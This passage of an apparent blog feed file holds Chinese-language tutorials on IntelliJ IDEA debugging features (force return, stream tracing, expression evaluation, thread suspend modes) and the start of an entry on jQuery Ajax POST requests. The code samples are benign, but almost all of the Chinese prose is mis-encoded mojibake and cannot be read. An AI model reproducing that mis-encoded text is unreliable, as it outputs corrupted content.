beançš„åˆå§‹åŒ–æµç¨‹ï¼Œåˆ™å¯ä»¥åœ¨åˆå§‹åŒ–çš„å…¥å£è®¾ç½® beanName.equals(â€œâ€) è¡¨è¾¾å¼ï¼Œæ¥è¾¾åˆ°åªåœ¨æˆ‘ä»¬å…³æ³¨çš„ bean æ‰§è¡Œæ—¶æ‰æš‚åœã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214172653364.png" alt="image-20221214172653364" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214172626920.png" alt="image-20221214172626920" /></p><h2 id="å¼ºåˆ¶è¿”å›force-return"><a class="markdownIt-Anchor" href="#å¼ºåˆ¶è¿”å›force-return"></a> å¼ºåˆ¶è¿”å›ï¼ˆForce Returnï¼‰</h2><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214172951359.png" alt="image-20221214172951359" /><br />åŠŸèƒ½ï¼šå¼ºåˆ¶ç»“æŸå½“å‰ç¨‹åºè¿è¡Œæµç¨‹ï¼Œç›´æ¥è¿”å›ã€‚</p><p>å½“æˆ‘ä»¬è°ƒè¯•æ—¶ï¼Œå‘ç°ç»§ç»­å¾€ä¸‹æ‰§è¡Œå°±è¦å°†é”™è¯¯çš„æ•°æ®å†™å…¥æ•°æ®åº“æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ Force Return æ¥å¼ºè¡Œç»“æŸå½“å‰æµç¨‹ã€‚<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214173011724.png" alt="image-20221214173011724" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214173059173.png" alt="image-20221214173059173" /></p><p>è€Œå¦‚æœæˆ‘ä»¬æ˜¯é€šè¿‡ Stop æŒ‰é’®æ¥ç»“æŸï¼Œæ­¤æ—¶ç»“æŸçš„æ˜¯ Debug æµç¨‹ï¼Œè€Œç¨‹åºæµç¨‹è¿˜æ˜¯ä¼šå¾€ä¸‹æ‰§è¡Œï¼Œä»è€Œå°†é”™è¯¯æ•°æ®å†™å…¥æ•°æ®åº“ã€‚</p><h2 id="stream-è°ƒè¯•trace-current-stream-chain"><a class="markdownIt-Anchor" href="#stream-è°ƒè¯•trace-current-stream-chain"></a> Stream è°ƒè¯•ï¼ˆTrace Current Stream Chainï¼‰</h2><p>åŠŸèƒ½ï¼šå½“æˆ‘ä»¬æš‚åœåœ¨ Stream çš„å¤„ç†ä»£ç è¡Œæ—¶ï¼Œå¯ä»¥å°† Stream çš„æ•´ä¸ªå¤„ç†æµç¨‹ä»¥å›¾å½¢åŒ–ç•Œé¢çš„å½¢å¼å±•ç¤ºã€‚<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214173612204.png" alt="image-20221214173612204" /><br />åˆç†çš„ä½¿ç”¨ Stream ä¼šè®©æˆ‘ä»¬çš„ä»£ç æ›´åŠ ç®€æ´ï¼Œä½†æ˜¯ç°åœ¨å­˜åœ¨å¤§é‡æ»¥ç”¨ Stream çš„æƒ…å†µï¼ŒStream æœ¬èº«å°±æ¯”è¾ƒæŠ½è±¡ï¼Œå¤§é‡æ»¥ç”¨ä¼šä½¿å¾— Streamçš„ä»£ç éš¾ä»¥ç†è§£å’Œè°ƒè¯•ã€‚</p><p>å½“æˆ‘ä»¬å‘ç°é—®é¢˜å‡ºåœ¨ Stream çš„å¤„ç†æµç¨‹ä¸­æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¯¥åŠŸèƒ½æ¥çœ‹åˆ°æ¯ä¸ªæ­¥éª¤å¤„ç†å‰å’Œå¤„ç†åçš„æ•°æ®ï¼Œæ–¹ä¾¿æˆ‘ä»¬å®šä½æ’æŸ¥æ˜¯å“ªä¸€æ­¥å‡ºäº†é—®é¢˜ã€‚</p><h2 id="æ‰§è¡Œè¡¨è¾¾å¼evaluate-expression"><a class="markdownIt-Anchor" href="#æ‰§è¡Œè¡¨è¾¾å¼evaluate-expression"></a> æ‰§è¡Œè¡¨è¾¾å¼ï¼ˆEvaluate Expressionï¼‰</h2><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214174624265.png" alt="image-20221214174624265" /><br />åŠŸèƒ½ï¼šç”¨äºæ‰§è¡Œä¸€æ®µæˆ‘ä»¬å®æ—¶å†™çš„ä»£ç ï¼Œä¾‹å¦‚æŸ¥çœ‹æ•°æ®ã€ä¿®æ”¹æ•°æ®ã€‚<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214174538052.png" alt="image-20221214174538052" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214174552746.png" alt="image-20221214174552746" /></p><p>å½“æˆ‘ä»¬åœ¨æµ‹è¯•æ—¶ï¼Œå‘ç°æŸæ®µä»£ç é€»è¾‘å¾ˆéš¾æœ‰ç¬¦åˆæ¡ä»¶çš„æ•°æ®æ—¶ï¼Œå¯ä»¥é€šè¿‡è¯¥åŠŸèƒ½ç›´æ¥ä¿®æ”¹æ•°æ®ï¼Œæ¥åŠ å¿«æˆ‘ä»¬çš„æµ‹è¯•ã€‚</p><h3 id="å˜é‡æŸ¥çœ‹"><a class="markdownIt-Anchor" href="#å˜é‡æŸ¥çœ‹"></a> <strong>å˜é‡æŸ¥çœ‹</strong></h3><p>åœ¨è°ƒè¯•è¿‡ç¨‹ä¸­å¾€å¾€éœ€è¦è§‚å¯Ÿå˜é‡çš„å˜åŒ–æ¥åˆ¤æ–­ä¸šåŠ¡é€»è¾‘ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä»¥ä¸‹çš„å››ä¸ªåœ°æ–¹è§‚å¯Ÿã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214192846353.png" alt="image-20221214192846353" /></p><p><strong>â‘ </strong> æœ€å¸¸ç”¨çš„å˜é‡çš„è§‚å¯ŸåŒºåŸŸvariables</p><p><strong>â‘¡</strong> IDEAä¸­æœ€äººæ€§åŒ–çš„åœ°æ–¹ä¹‹ä¸€ï¼Œä¼šå°†å˜é‡çš„å€¼é˜´å½±æ˜¾ç¤ºåœ¨å˜é‡çš„åé¢ã€‚</p><p><strong>â‘¢</strong> watchåŒºåŸŸï¼Œçœ¼é•œçš„å½¢çŠ¶ï¼Œä¸€èˆ¬ä¸ä¼šå±•å¼€ã€‚å¦‚ä¸‹å›¾ï¼š</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214192924566.png" alt="image-20221214192924566" /></p><p>ç‚¹å‡»â€™+â€˜å·å¯ä»¥æ–°å¢éœ€è¦è§‚å¯Ÿçš„å˜é‡ï¼Œç‚¹å‡»â€™-'å·å¯ä»¥åˆ é™¤ã€‚</p><p><strong>â‘£</strong> é¼ æ ‡æ‚¬åœåœ¨å˜é‡ä¸Šä¹Ÿä¼šå‡ºç°å˜é‡çš„å€¼ï¼Œç‚¹å‡»å±•å¼€å³å¯æŸ¥çœ‹ã€‚</p><h2 id="è®©æ–­ç‚¹å¤„çš„ä»£ç å†åŠ ä¸€è¡Œä»£ç "><a class="markdownIt-Anchor" href="#è®©æ–­ç‚¹å¤„çš„ä»£ç å†åŠ ä¸€è¡Œä»£ç "></a> è®©æ–­ç‚¹å¤„çš„ä»£ç å†åŠ ä¸€è¡Œä»£ç </h2><ul><li>ç‚¹å‡»ä¸‹å›¾çš„åŠ å·ï¼Œå¯ä»¥åœ¨æ–­ç‚¹å¤„åŠ ä¸€è¡Œä»£ç ï¼Œæ¯”å¦‚ä¸‹å›¾ä¸­çš„count++å³ä¸ºæ–°æ·»åŠ çš„ä»£ç </li><li><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214185633384.png" alt="image-20221214185633384" /><ul><li>é€‰ä¸­count++ï¼Œå³é”®ç‚¹å‡»Editå¯ä»¥ç¼–è¾‘è¯¥ä»£ç </li><li>é€‰ä¸­è¯¥è¡Œä»£ç ï¼ˆcount++ï¼‰ï¼Œç‚¹å‡»åŠ å·ä¸‹é¢çš„å‡å·ï¼Œå¯ä»¥åˆ é™¤è¯¥è¡Œä»£ç </li></ul></li><li>æˆ‘çŒœæƒ³æ˜¯<ul><li><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214190206459.png" alt="image-20221214190206459" /></li></ul></li></ul><h2 id="è®©ç¨‹åºæ‰§è¡Œåˆ°ä¸‹ä¸€æ¬¡æ–­ç‚¹åæš‚åœ"><a class="markdownIt-Anchor" href="#è®©ç¨‹åºæ‰§è¡Œåˆ°ä¸‹ä¸€æ¬¡æ–­ç‚¹åæš‚åœ"></a> è®©ç¨‹åºæ‰§è¡Œåˆ°ä¸‹ä¸€æ¬¡æ–­ç‚¹åæš‚åœ</h2><ul><li>ç‚¹å‡»ä¸‹å›¾çš„æŒ‰é’®ï¼Œdebugä¼šç»§ç»­è¿è¡Œç¨‹åºï¼Œç›´åˆ°é‡åˆ°ä¸‹ä¸€æ¬¡æ–­ç‚¹åæš‚åœ</li><li><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214184803359.png" alt="image-20221214184803359" /></li></ul><h2 id="åœæ­¢debugç¨‹åº"><a class="markdownIt-Anchor" href="#åœæ­¢debugç¨‹åº"></a> åœæ­¢debugç¨‹åº</h2><ul><li><p>ç‚¹å‡»ä¸‹å›¾æŒ‰é’®åœæ­¢debugç¨‹åº</p></li><li><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214184637000.png" alt="image-20221214184637000" /></p></li><li><p>æ³¨æ„</p><ul><li>è¿è¡Œçš„å¦‚æœæ˜¯javaSEé¡¹ç›®ï¼Œç‚¹ä¸€ä¸‹å°±åœæ­¢(ç¨‹åºä¼šæ‰§è¡Œå®Œæˆ)</li><li>è¿è¡Œçš„å¦‚æœæ˜¯javaWebé¡¹ç›®ï¼Œéœ€è¦ç‚¹ä¸¤ä¸‹<ul><li>ç¬¬ä¸€ä¸‹åœæ­¢ä»£ç çš„å½“å‰çº¿ç¨‹</li><li>ç¬¬äºŒä¸‹åœæ­¢æœåŠ¡å™¨</li></ul></li></ul></li></ul><h2 id="å±è”½æ‰€æœ‰æ–­ç‚¹"><a class="markdownIt-Anchor" href="#å±è”½æ‰€æœ‰æ–­ç‚¹"></a> å±è”½æ‰€æœ‰æ–­ç‚¹</h2><ul><li><p>ç‚¹å‡»ä¸‹å›¾æŒ‰é’®ï¼Œå¯ä»¥å±è”½æ‰€æœ‰æ–­ç‚¹</p></li><li><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214184506838.png" alt="image-20221214184506838" /></p><p>å±è”½çš„æ–­ç‚¹åœ¨debugçš„æ—¶å€™ä¸ä¼šè¿è¡Œ</p><ul><li>å¦‚æœç¨‹åºè°ƒè¯•åè§‰å¾—æ²¡é—®é¢˜äº†ï¼Œå¯ä»¥å±è”½æ‰æ‰€æœ‰æ–­ç‚¹ç»§ç»­è¿è¡Œç¨‹åºæŸ¥çœ‹æ•ˆæœ</li></ul></li></ul><h2 id="æŠŠå…‰æ ‡ç§»åˆ°å½“å‰ç¨‹åºè¿è¡Œä½ç½®"><a class="markdownIt-Anchor" href="#æŠŠå…‰æ ‡ç§»åˆ°å½“å‰ç¨‹åºè¿è¡Œä½ç½®"></a> æŠŠå…‰æ ‡ç§»åˆ°å½“å‰ç¨‹åºè¿è¡Œä½ç½®</h2><ul><li>ç‚¹å‡»ä¸‹å›¾æŒ‰é’®åï¼Œä¼šæŠŠé¼ æ ‡å…‰æ ‡ç§»åŠ¨åˆ°å½“å‰ç¨‹åºè¿è¡Œä½ç½®<ul><li>å½“ç¨‹åºä»£ç é‡å¾ˆå¤§çš„æ—¶å€™ï¼Œå¯ä»¥é€šè¿‡è¯¥æŒ‰é’®å¿«é€Ÿå®šä½åˆ°ç¨‹åºè¿è¡Œä½ç½®</li><li><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214184408221.png" alt="image-20221214184408221" /></li></ul></li></ul><h2 id="ç›´æ¥æ‰§è¡Œåˆ°å…‰æ ‡æ‰€åœ¨ä½ç½®"><a class="markdownIt-Anchor" href="#ç›´æ¥æ‰§è¡Œåˆ°å…‰æ ‡æ‰€åœ¨ä½ç½®"></a> ç›´æ¥æ‰§è¡Œåˆ°å…‰æ ‡æ‰€åœ¨ä½ç½®</h2><p>ç‚¹å‡»ä¸‹å›¾çš„æŒ‰é’®ï¼Œç¨‹åºä¼šæ‰§è¡Œåˆ°å…‰æ ‡æ‰€åœ¨çš„ä½ç½®</p><ul><li>å‰ææ˜¯å…‰æ ‡å‰é¢æ²¡æœ‰æ–­ç‚¹ï¼Œå¦åˆ™ç¨‹åºè¿˜æ˜¯ä¼šåœ¨å…‰æ ‡å‰é¢çš„æ–­ç‚¹å¤„æš‚åœ</li></ul><p>è¯¥åŠŸèƒ½éå¸¸å¼ºå¤§ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¿™è¾¹æ‰§è¡Œä»»ä½•é€»è¾‘ã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214184115097.png" alt="image-20221214184115097" /></p><h2 id="åœ¨æ§åˆ¶å°æ”¹å˜æ­£åœ¨debugçš„æ•°æ®"><a class="markdownIt-Anchor" href="#åœ¨æ§åˆ¶å°æ”¹å˜æ­£åœ¨debugçš„æ•°æ®"></a> åœ¨æ§åˆ¶å°æ”¹å˜æ­£åœ¨debugçš„æ•°æ®</h2><ul><li>åœ¨æ§åˆ¶å°é€‰ä¸­æŸä¸ªå˜é‡ï¼Œå³é”®ç‚¹å‡»Set Valueå¯ä»¥æ”¹å˜è¯¥å˜é‡çš„å€¼<ul><li>å¦‚æœæƒ³æµ‹è¯•æŸä¸ªåœ°æ–¹çš„æ•°æ®å¦‚æœæ˜¯æ­£ç¡®çš„ä¼šæ˜¯ä»€ä¹ˆæ•ˆæœï¼Œå¯ä»¥æ‰‹åŠ¨æ›´æ”¹è¯¥å¤„å˜é‡çš„å€¼<img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214184206110.png" alt="image-20221214184206110" /></li></ul></li></ul><h3 id=""><a class="markdownIt-Anchor" href="#"></a> </h3><h2 id="å¤šçº¿ç¨‹è°ƒè¯•suspend"><a class="markdownIt-Anchor" href="#å¤šçº¿ç¨‹è°ƒè¯•suspend"></a> å¤šçº¿ç¨‹è°ƒè¯•ï¼ˆSuspendï¼‰</h2><p>Suspend æœ‰ä¸¤ç§æ¨¡å¼ï¼šAll å’Œ Threadã€‚</p><p><strong>Thread</strong>ï¼šæš‚åœè¿›å…¥æ–­ç‚¹çš„çº¿ç¨‹ï¼Œä¸å½±å“å…¶ä»–çº¿ç¨‹æ‰§è¡Œã€‚æ‰€æœ‰è¿›å…¥æ–­ç”µçš„çº¿ç¨‹ä¾æ¬¡Debugã€‚</p><p><strong>All</strong>ï¼šæš‚åœå…¨éƒ¨çº¿ç¨‹ã€‚åªèƒ½ Debug ç¬¬ä¸€ä¸ªæš‚åœçº¿ç¨‹ã€‚</p><p>æµ‹è¯•ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-meta">@Test</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test2</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(()-&gt;&#123;<br>            System.out.println(<span class="hljs-string">&quot;start1&quot;</span>);<br>            System.out.println(<span class="hljs-string">&quot;end1&quot;</span>);<br>        &#125;).start();<br><br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(()-&gt;&#123;<br>            System.out.println(<span class="hljs-string">&quot;start2&quot;</span>);<br>            System.out.println(<span class="hljs-string">&quot;end2&quot;</span>);<br>        &#125;).start();<br>    &#125;<br></code></pre></td></tr></table></figure><h3 id="threadæ¨¡å¼æ‰§è¡Œ"><a class="markdownIt-Anchor" href="#threadæ¨¡å¼æ‰§è¡Œ"></a> Threadæ¨¡å¼æ‰§è¡Œ</h3><p>é€šè¿‡è¾“å‡ºå†…å®¹ï¼Œå¯ä»¥çœ‹åˆ°çº¿ç¨‹1è¢«é˜»å¡ï¼Œçº¿ç¨‹2å’Œä¸»çº¿ç¨‹éƒ½å·²ç»æ‰§è¡Œç»“æŸ</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214191658181.png" alt="image-20221214191658181" /></p><h3 id="all-æ¨¡å¼æ‰§è¡Œ"><a class="markdownIt-Anchor" href="#all-æ¨¡å¼æ‰§è¡Œ"></a> All æ¨¡å¼æ‰§è¡Œ</h3><p>å¯ä»¥çœ‹åˆ°çº¿ç¨‹2å’Œä¸»çº¿ç¨‹æ²¡æœ‰ä½¿ç”¨æ–­ç‚¹ï¼Œä½†æ˜¯ä¹Ÿè¢«æš‚åœäº†ï¼Œå› ä¸ºæ²¡æœ‰è¾“å‡ºå†…å®¹ã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214191655321.png" alt="image-20221214191655321" /></p><h3 id="è¿˜æœ‰è¿œç¨‹debugæ²¡æœ‰æ¡ä»¶-ç­‰ä»¥åæ¥å­¦ä¹ "><a class="markdownIt-Anchor" href="#è¿˜æœ‰è¿œç¨‹debugæ²¡æœ‰æ¡ä»¶-ç­‰ä»¥åæ¥å­¦ä¹ "></a> è¿˜æœ‰è¿œç¨‹deBugï¼Œæ²¡æœ‰æ¡ä»¶ã€‚ç­‰ä»¥åæ¥å­¦ä¹ ï¼</h3><h3 id="å‚è€ƒæ–‡ç« "><a class="markdownIt-Anchor" href="#å‚è€ƒæ–‡ç« "></a> å‚è€ƒæ–‡ç« </h3><ol><li><p><a href="https://blog.csdn.net/future_god_qr/article/details/121250865?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167099915116800192291037%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=167099915116800192291037&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-121250865-null-null.142%5Ev68%5Econtrol,201%5Ev4%5Eadd_ask,213%5Ev2%5Et3_esquery_v2&amp;utm_term=ideadebug%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A7&amp;spm=1018.2226.3001.4187">IDEAçš„debugè°ƒè¯•æŠ€å·§è¯¦è§£</a></p></li><li><p><a href="https://blog.csdn.net/qq_43102730/article/details/125252811?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167099915116800192291037%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=167099915116800192291037&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-2-125252811-null-null.142%5Ev68%5Econtrol,201%5Ev4%5Eadd_ask,213%5Ev2%5Et3_esquery_v2&amp;utm_term=ideadebug%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A7&amp;spm=1018.2226.3001.4187">å®ç”¨çš„ IDEA Debug è°ƒè¯•æŠ€å·§ï¼ˆè¶…è¯¦ç»†æ¡ˆä¾‹ï¼‰</a></p></li><li><p><a href="https://blog.csdn.net/qq_34162294/article/details/105260153?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=idea%20Throw%20Exception&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-4-105260153.142%5Ev68%5Econtrol,201%5Ev4%5Eadd_ask,213%5Ev2%5Et3_esquery_v2&amp;spm=1018.2226.3001.4187">å¤§ç‰›éƒ½ä¼šç”¨çš„IDEAè°ƒè¯•æŠ€å·§ï¼ï¼ï¼</a></p></li></ol>]]></content>
    
    
    <categories>
      
      <category>idea</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idea</tag>
      
      <tag>debug</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Axioså’ŒAjaxå‘é€POSTä½¿ç”¨</title>
    <link href="/2022/12/13/Axios%E5%92%8CAjax%E5%8F%91%E9%80%81POST%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/12/13/Axios%E5%92%8CAjax%E5%8F%91%E9%80%81POST%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="ajax"><a class="markdownIt-Anchor" href="#ajax"></a> Ajax</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Ajax_test</span>(<span class="hljs-params"></span>) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Ajax_test&quot;</span>);<br>            $.<span class="hljs-title function_">ajax</span>(&#123;<br>                <span class="hljs-attr">type</span>: <span class="hljs-string">&quot;post&quot;</span>,<br>                <span class="hljs-attr">url</span>: <span class="hljs-string">&quot;http://localhost:8080/get1&quot;</span>,<br>                <span class="hljs-attr">data</span>: &#123;<br>                    <span class="hljs-string">&#x27;content&#x27;</span>: <span class="hljs-string">&quot;Ajax_test2&quot;</span><br>                &#125;,<br>                <span class="hljs-comment">// contentType: &quot;application/json&quot;,</span><br>                <span class="hljs-comment">// dataType:&quot;json&quot;, //è¡¨ç¤ºå¯ä»¥è·¨åŸŸè®¿é—®jsonæ•°æ®</span><br>                <span class="hljs-attr">async</span>: <span class="hljs-literal">false</span>, <span class="hljs-comment">//é”å®šæµè§ˆå™¨ï¼Œåªæœ‰è¯·æ±‚å¤„ç†å®Œæ¯•ä¹‹åï¼ˆå›è°ƒå‡½æ•°è°ƒç”¨å®Œæˆä¹‹åï¼‰ï¼Œæ‰èƒ½æ‰§è¡Œåé¢çš„ä»£ç </span><br>                <span class="hljs-attr">success</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">data</span>) &#123;<br>                    <span class="hljs-comment">//å¤„ç†è¿”å›æ•°æ®</span><br>                &#125;,<br>                <span class="hljs-attr">error</span>: &#123;&#125;<br>            &#125;)<br>        &#125;<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221213215749518.png" alt="image-20221213215749518" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221213215929173.png" alt="" /></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Ajax_test</span>(<span class="hljs-params"></span>) &#123;<br>           <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Ajax_test&quot;</span>);<br>           $.<span class="hljs-title function_">ajax</span>(&#123;<br>               <span class="hljs-attr">type</span>: <span class="hljs-string">&quot;post&quot;</span>,<br>               <span class="hljs-attr">url</span>: <span class="hljs-string">&quot;http://localhost:8080/get1&quot;</span>,<br>               <span class="hljs-attr">data</span>: &#123;<br>                   <span class="hljs-string">&#x27;content&#x27;</span>: <span class="hljs-string">&quot;Ajax_test2&quot;</span><br>               &#125;,<br>               <span class="hljs-attr">contentType</span>: <span class="hljs-string">&quot;application/json&quot;</span>,<br>               <span class="hljs-comment">// dataType:&quot;json&quot;, //è¡¨ç¤ºå¯ä»¥è·¨åŸŸè®¿é—®jsonæ•°æ®</span><br>               <span class="hljs-attr">async</span>: <span class="hljs-literal">false</span>, <span class="hljs-comment">//é”å®šæµè§ˆå™¨ï¼Œåªæœ‰è¯·æ±‚å¤„ç†å®Œæ¯•ä¹‹åï¼ˆå›è°ƒå‡½æ•°è°ƒç”¨å®Œæˆä¹‹åï¼‰ï¼Œæ‰èƒ½æ‰§è¡Œåé¢çš„ä»£ç </span><br>               <span class="hljs-attr">success</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">data</span>) &#123;<br>                   <span class="hljs-comment">//å¤„ç†è¿”å›æ•°æ®</span><br>               &#125;,<br>               <span class="hljs-attr">error</span>: &#123;&#125;<br>           &#125;)<br>       &#125;<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221213215929173.png" alt="image-20221213215929173" /></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Ajax_test</span>(<span class="hljs-params"></span>) &#123;<br>           <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Ajax_test&quot;</span>);<br>           $.<span class="hljs-title function_">ajax</span>(&#123;<br>               <span class="hljs-attr">type</span>: <span class="hljs-string">&quot;post&quot;</span>,<br>               <span class="hljs-attr">url</span>: <span class="hljs-string">&quot;/&quot;</span>,<br>               <span class="hljs-attr">data</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123;<br>                   <span class="hljs-string">&#x27;content&#x27;</span>: <span class="hljs-string">&quot;Ajax_test2&quot;</span><br>               &#125;),<br>               <span class="hljs-comment">// contentType: &quot;application/json&quot;,</span><br>               <span class="hljs-comment">// dataType:&quot;json&quot;, //è¡¨ç¤ºå¯ä»¥è·¨åŸŸè®¿é—®jsonæ•°æ®</span><br>               <span class="hljs-attr">headers</span>: &#123;<br>               &#125;,<br>               <span class="hljs-attr">async</span>: <span class="hljs-literal">false</span>, <span class="hljs-comment">//é”å®šæµè§ˆå™¨ï¼Œåªæœ‰è¯·æ±‚å¤„ç†å®Œæ¯•ä¹‹åï¼ˆå›è°ƒå‡½æ•°è°ƒç”¨å®Œæˆä¹‹åï¼‰ï¼Œæ‰èƒ½æ‰§è¡Œåé¢çš„ä»£ç </span><br>               <span class="hljs-attr">success</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">data</span>) &#123;<br>                   <span class="hljs-comment">//å¤„ç†è¿”å›æ•°æ®</span><br>               &#125;,<br>               <span class="hljs-attr">error</span>: &#123;&#125;<br>           &#125;)<br>       &#125;<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221213220541531.png" alt="image-20221213220541531" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221213220553995.png" alt="image-20221213220553995" /></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Ajax_test</span>(<span class="hljs-params"></span>) &#123;<br>           <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Ajax_test&quot;</span>);<br>           $.<span class="hljs-title function_">ajax</span>(&#123;<br>               <span class="hljs-attr">type</span>: <span class="hljs-string">&quot;post&quot;</span>,<br>               <span class="hljs-attr">url</span>: <span class="hljs-string">&quot;/&quot;</span>,<br>               <span class="hljs-attr">data</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123;<br>                   <span class="hljs-string">&#x27;content&#x27;</span>: <span class="hljs-string">&quot;Ajax_test2&quot;</span><br>               &#125;),<br>               <span class="hljs-attr">contentType</span>: <span class="hljs-string">&quot;application/json&quot;</span>,<br>               <span class="hljs-comment">// dataType:&quot;json&quot;, //è¡¨ç¤ºå¯ä»¥è·¨åŸŸè®¿é—®jsonæ•°æ®</span><br>               <span class="hljs-attr">headers</span>: &#123;<br>               &#125;,<br>               <span class="hljs-attr">async</span>: <span class="hljs-literal">false</span>, <span 